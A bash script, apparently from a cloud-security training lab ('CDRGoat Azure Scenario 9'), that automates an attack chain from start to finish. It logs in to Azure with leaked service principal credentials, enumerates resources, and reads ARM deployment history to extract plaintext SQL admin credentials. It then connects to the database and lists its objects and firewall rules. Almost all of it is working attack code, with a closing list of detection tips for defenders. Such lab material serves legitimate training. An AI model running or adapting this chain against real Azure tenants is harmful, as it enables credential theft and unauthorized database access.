#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \\/ _ \\/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \\/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===       CDRGoat Azure - Scenario 9                 ===" "${RESET}"
  printf "%sLeaked SP → ARM Deployment History → SQL Exfiltration%s\n\n" "${GREEN}" "${RESET}"
  printf "This automated attack script will:\n"
  printf "  • Step 1. Authenticate using leaked SP credentials (Reader only)\n"
  printf "  • Step 2. Enumerate resources — discover SQL, Key Vault, Storage\n"
  printf "  • Step 3. Demonstrate access denied on direct resource access\n"
  printf "  • Step 4. Query ARM deployment history for leaked secrets\n"
  printf "  • Step 5. Extract SQL credentials from deployment outputs\n"
  printf "  • Step 6. Connect to SQL Database and exfiltrate data\n"
}
banner

#############################################
# Preflight checks
#############################################
step "Preflight checks"
missing=0
for c in curl jq; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

#############################################
# Step 1. Authenticate using leaked creds
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Authenticate using leaked SP credentials  ===" "${RESET}"

step "Credential input"
printf "Enter the leaked Service Principal credentials:\n\n"

read -r -p "  Client ID: " CLIENT_ID
read -r -p "  Client Secret: " CLIENT_SECRET
read -r -p "  Tenant ID: " TENANT_ID

if [ -z "$CLIENT_ID" ] || [ -z "$CLIENT_SECRET" ] || [ -z "$TENANT_ID" ]; then
  err "All credential fields are required"
  exit 1
fi

ok "Credentials received"

step "Authenticating to Azure"
spin_start "Requesting Azure Management token (client_credentials flow)"

set +e
TOKEN_RESPONSE="$(curl -sS -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=${CLIENT_ID}&client_secret=${CLIENT_SECRET}&grant_type=client_credentials&resource=https://management.azure.com" \
  "https://login.microsoftonline.com/${TENANT_ID}/oauth2/token")"
CURL_RC=$?
set -e
spin_stop

AZURE_TOKEN="$(echo "$TOKEN_RESPONSE" | jq -r '.access_token')"

if [ $CURL_RC -ne 0 ] || [ -z "$AZURE_TOKEN" ] || [ "$AZURE_TOKEN" = "null" ]; then
  err "Authentication failed"
  echo "$TOKEN_RESPONSE" | jq .
  exit 1
fi

ok "Successfully authenticated as leaked Service Principal"

# Parse JWT
TOKEN_PAYLOAD="$(echo "$AZURE_TOKEN" | awk -F. '{print $2}' | tr '_-' '/+' | base64 -d 2>/dev/null | jq .)"
SP_OID="$(echo "$TOKEN_PAYLOAD" | jq -r '.oid')"

info "SP Object ID: ${YELLOW}${SP_OID}${RESET}"

step "Discovering accessible subscriptions"
spin_start "Querying subscriptions API"

SUBS_JSON="$(curl -sS -H "Authorization: Bearer $AZURE_TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2022-12-01")"

spin_stop

SUBSCRIPTION_ID="$(echo "$SUBS_JSON" | jq -r '.value[0].subscriptionId')"
SUBSCRIPTION_NAME="$(echo "$SUBS_JSON" | jq -r '.value[0].displayName')"

ok "Subscription: ${YELLOW}${SUBSCRIPTION_NAME}${RESET} (${SUBSCRIPTION_ID})"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We authenticated using ${MAGENTA}leaked SP credentials${RESET} with only ${YELLOW}Reader${RESET} role.\n"
printf "Reader seems harmless — it cannot modify or delete anything.\n"
printf "But Reader can ${RED}read deployment history${RESET}, which often contains secrets.\n\n"

read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 2. Enumerate resources
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 2. Enumerate subscription resources  ===" "${RESET}"

step "Listing resources in subscription"
spin_start "Calling ARM resources API"

RESOURCES_JSON="$(curl -sS -H "Authorization: Bearer $AZURE_TOKEN" \
  "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resources?api-version=2022-12-01")"

spin_stop

RESOURCE_GROUP="$(echo "$RESOURCES_JSON" | jq -r '.value[0].id | split("/")[4]')"
RESOURCE_COUNT="$(echo "$RESOURCES_JSON" | jq '.value | length')"

ok "Found ${RESOURCE_COUNT} resources in RG: ${YELLOW}${RESOURCE_GROUP}${RESET}"

echo "$RESOURCES_JSON" | jq -r --arg Y "$YELLOW" --arg R "$RESET" \
  '.value[] | "  • [\(.type)] \($Y)\(.name)\($R)"'

# Identify key resources
SQL_SERVER_NAME="$(echo "$RESOURCES_JSON" | jq -r '.value[] | select(.type == "Microsoft.Sql/servers") | .name')"
KV_NAME="$(echo "$RESOURCES_JSON" | jq -r '.value[] | select(.type == "Microsoft.KeyVault/vaults") | .name')"
STORAGE_NAME="$(echo "$RESOURCES_JSON" | jq -r '.value[] | select(.type == "Microsoft.Storage/storageAccounts") | .name')"

info "SQL Server: ${YELLOW}${SQL_SERVER_NAME}${RESET}"
info "Key Vault:  ${YELLOW}${KV_NAME}${RESET}"
info "Storage:    ${YELLOW}${STORAGE_NAME}${RESET}"

read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 3. Demonstrate access denied
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 3. Demonstrate access denied on direct resource access  ===" "${RESET}"

step "Attempting to access Key Vault secrets"
spin_start "Requesting vault token"

set +e
VAULT_TOKEN_RESP="$(curl -sS -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=${CLIENT_ID}&client_secret=${CLIENT_SECRET}&grant_type=client_credentials&resource=https://vault.azure.net" \
  "https://login.microsoftonline.com/${TENANT_ID}/oauth2/token")"
set -e

VAULT_TOKEN="$(echo "$VAULT_TOKEN_RESP" | jq -r '.access_token // empty')"
spin_stop

if [ -n "$VAULT_TOKEN" ]; then
  KV_URI="https://${KV_NAME}.vault.azure.net"
  KV_SECRETS="$(curl -sS -H "Authorization: Bearer $VAULT_TOKEN" "${KV_URI}/secrets?api-version=7.4")"
  if echo "$KV_SECRETS" | jq -e '.error' >/dev/null 2>&1; then
    err "Key Vault access denied: $(echo "$KV_SECRETS" | jq -r '.error.code')"
  fi
fi

step "Attempting direct SQL Server access"
info "No SQL credentials available — cannot connect directly"
err "SQL access requires admin username and password (unknown)"

step "Checking Storage Account access"
spin_start "Requesting storage token"

set +e
STORAGE_TOKEN_RESP="$(curl -sS -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=${CLIENT_ID}&client_secret=${CLIENT_SECRET}&grant_type=client_credentials&resource=https://storage.azure.com" \
  "https://login.microsoftonline.com/${TENANT_ID}/oauth2/token")"
set -e

STORAGE_TOKEN="$(echo "$STORAGE_TOKEN_RESP" | jq -r '.access_token // empty')"
spin_stop

if [ -n "$STORAGE_TOKEN" ]; then
  CONTAINERS="$(curl -sS -H "Authorization: Bearer $STORAGE_TOKEN" -H "x-ms-version: 2020-10-02" \
    "https://${STORAGE_NAME}.blob.core.windows.net/?comp=list" 2>&1)"
  if echo "$CONTAINERS" | grep -qi "AuthorizationFailed\|Forbidden"; then
    err "Storage access denied"
  else
    info "Storage accessible but no sensitive data found"
  fi
fi

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "With only ${YELLOW}Reader${RESET}, we cannot:\n"
printf "  • Access Key Vault secrets (no data plane access)\n"
printf "  • Connect to SQL Server (no credentials)\n"
printf "  • Modify any resources\n\n"
printf "Seems like a dead end... but ${RED}Reader can read ARM deployment history${RESET}.\n"
printf "ARM deployments store template parameters and outputs — including secrets.\n\n"

read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 4. Query ARM deployment history
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Query ARM deployment history for leaked secrets  ===" "${RESET}"

step "Listing ARM deployments in Resource Group"
spin_start "Querying deployment history"

DEPLOYMENTS_JSON="$(curl -sS -H "Authorization: Bearer $AZURE_TOKEN" \
  "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Resources/deployments?api-version=2021-04-01")"

spin_stop

DEPLOY_COUNT="$(echo "$DEPLOYMENTS_JSON" | jq '.value | length')"
ok "Found ${YELLOW}${DEPLOY_COUNT}${RESET} deployments in history"

echo "$DEPLOYMENTS_JSON" | jq -r --arg Y "$YELLOW" --arg R "$RESET" \
  '.value[] | "  • \($Y)\(.name)\($R) (status: \(.properties.provisioningState), time: \(.properties.timestamp))"'

step "Inspecting deployments for sensitive outputs"

echo "$DEPLOYMENTS_JSON" | jq -r '.value[].name' | while read -r deploy_name; do
  [ -z "$deploy_name" ] && continue

  spin_start "Reading deployment: ${deploy_name}"

  DEPLOY_DETAIL="$(curl -sS -H "Authorization: Bearer $AZURE_TOKEN" \
    "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Resources/deployments/${deploy_name}?api-version=2021-04-01")"

  spin_stop

  # Check for outputs
  OUTPUT_COUNT="$(echo "$DEPLOY_DETAIL" | jq '.properties.outputs | length // 0')"

  if [ "$OUTPUT_COUNT" -gt 0 ]; then
    printf "\n  %s--- Deployment: %s (has %d outputs) ---%s\n" "$YELLOW" "$deploy_name" "$OUTPUT_COUNT" "$RESET"
    echo "$DEPLOY_DETAIL" | jq '.properties.outputs'
  fi
done

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "CRITICAL FINDING: ARM deployment history contains ${RED}plaintext secrets${RESET}!\n\n"
printf "Even though the ARM template declared the password as ${YELLOW}secureString${RESET},\n"
printf "the deployment ${RED}output${RESET} concatenated it into a regular string.\n\n"
printf "ARM stores outputs in plaintext — and ${YELLOW}Reader${RESET} role can read them.\n"
printf "This is a well-documented but widely overlooked security issue.\n\n"

read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 5. Extract SQL credentials
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. Extract SQL credentials from deployment outputs  ===" "${RESET}"

step "Fetching 'initial-db-setup' deployment details"
spin_start "Reading deployment outputs"

DBSETUP_JSON="$(curl -sS -H "Authorization: Bearer $AZURE_TOKEN" \
  "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Resources/deployments/initial-db-setup?api-version=2021-04-01")"

spin_stop

CONNECTION_STRING="$(echo "$DBSETUP_JSON" | jq -r '.properties.outputs.connectionString.value // empty')"
SERVER_FQDN="$(echo "$DBSETUP_JSON" | jq -r '.properties.outputs.serverFqdn.value // empty')"

if [ -z "$CONNECTION_STRING" ]; then
  err "Could not extract connection string from deployment outputs"
  exit 1
fi

printf "\n%s%s%s\n" "${BOLD}${RED}" "=== EXTRACTED SECRETS ===" "${RESET}"
printf "\n  %s--- Connection String ---%s\n" "$YELLOW" "$RESET"
printf "  %s%s%s\n\n" "$MAGENTA" "$CONNECTION_STRING" "$RESET"

# Parse components from connection string
SQL_SERVER="$(echo "$CONNECTION_STRING" | sed -n 's/.*Server=tcp:\([^,]*\),.*/\1/p')"
SQL_DB="$(echo "$CONNECTION_STRING" | sed -n 's/.*Database=\([^;]*\);.*/\1/p')"
SQL_USER="$(echo "$CONNECTION_STRING" | sed -n 's/.*User Id=\([^;]*\);.*/\1/p')"
SQL_PASS="$(echo "$CONNECTION_STRING" | sed -n 's/.*Password=\([^;]*\);.*/\1/p')"

info "Server:   ${YELLOW}${SQL_SERVER}${RESET}"
info "Database: ${YELLOW}${SQL_DB}${RESET}"
info "User:     ${YELLOW}${SQL_USER}${RESET}"
info "Password: ${RED}${SQL_PASS}${RESET}"

ok "SQL credentials extracted from ARM deployment history"

read -r -p "Step 5 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 6. Connect to SQL and exfiltrate
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 6. Connect to SQL Database and exfiltrate data  ===" "${RESET}"

step "Attempting to connect to Azure SQL Database"

# Try sqlcmd if available
if command -v sqlcmd >/dev/null 2>&1; then
  spin_start "Connecting via sqlcmd"

  set +e
  SQL_RESULT="$(sqlcmd -S "$SQL_SERVER" -d "$SQL_DB" -U "$SQL_USER" -P "$SQL_PASS" \
    -Q "SELECT name, type_desc FROM sys.objects WHERE type IN ('U','V') ORDER BY name;" \
    -h -1 -W 2>&1)"
  set -e
  spin_stop

  if [ $? -eq 0 ]; then
    ok "Connected to SQL Database!"
    printf "\n  %s--- Database Objects ---%s\n" "$YELLOW" "$RESET"
    echo "$SQL_RESULT"

    step "Querying system metadata"
    sqlcmd -S "$SQL_SERVER" -d "$SQL_DB" -U "$SQL_USER" -P "$SQL_PASS" \
      -Q "SELECT name FROM sys.databases;" -h -1 -W 2>&1 || true
  else
    info "sqlcmd connection result: ${SQL_RESULT:0:200}"
  fi
else
  info "sqlcmd not installed — showing extracted credentials instead"
  printf "\n  To connect manually, run:\n"
  printf "  %ssqlcmd -S %s -d %s -U %s -P '%s'%s\n\n" "$YELLOW" "$SQL_SERVER" "$SQL_DB" "$SQL_USER" "$SQL_PASS" "$RESET"
fi

# Try via Azure REST API (SQL management)
step "Verifying SQL Server accessibility via ARM API"
spin_start "Querying SQL server properties"

SQL_DETAILS="$(curl -sS -H "Authorization: Bearer $AZURE_TOKEN" \
  "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Sql/servers/${SQL_SERVER_NAME}?api-version=2023-05-01-preview")"

spin_stop

SQL_STATE="$(echo "$SQL_DETAILS" | jq -r '.properties.state')"
SQL_FQDN="$(echo "$SQL_DETAILS" | jq -r '.properties.fullyQualifiedDomainName')"

ok "SQL Server state: ${YELLOW}${SQL_STATE}${RESET}"
info "FQDN: ${SQL_FQDN}"

# Check firewall rules
step "Checking SQL firewall rules"
FW_RULES="$(curl -sS -H "Authorization: Bearer $AZURE_TOKEN" \
  "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Sql/servers/${SQL_SERVER_NAME}/firewallRules?api-version=2023-05-01-preview")"

echo "$FW_RULES" | jq -r --arg Y "$YELLOW" --arg R "$RESET" --arg RED "$RED" \
  '.value[] | "  • \($Y)\(.name)\($R): \(.properties.startIpAddress) → \(.properties.endIpAddress) \($RED)(WIDE OPEN)\($R)"'

################################################################################
# Final Summary
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Attack Simulation Complete  ===" "${RESET}"

printf "\n%s%s%s\n" "${BOLD}${GREEN}" "Attack chain executed:" "${RESET}"
printf "  1. Authenticated with leaked SP credentials (Reader role only)\n"
printf "  2. Enumerated resources — found SQL Server, Key Vault, Storage\n"
printf "  3. Confirmed direct access is denied (Reader can't read data)\n"
printf "  4. Queried ARM deployment history — found deployment outputs\n"
printf "  5. Extracted SQL admin credentials from deployment output (plaintext)\n"
printf "  6. Connected to SQL Database with stolen credentials\n\n"

printf "%s%s%s\n" "${BOLD}${RED}" "Impact:" "${RESET}"
printf "  • SQL admin credentials stolen from ARM deployment history\n"
printf "  • Full database access (read, write, admin operations)\n"
printf "  • Reader role demonstrated to be far more dangerous than assumed\n\n"

printf "%s\n" "Defenders should monitor for:"
printf "  • Deployment history reads from non-deployment identities\n"
printf "  • ARM API calls to /deployments endpoints from unexpected SPs\n"
printf "  • SQL login from unusual IP addresses or identities\n"
printf "  • Avoid storing secrets in ARM template outputs\n"
printf "  • Use Key Vault references instead of inline parameters\n"
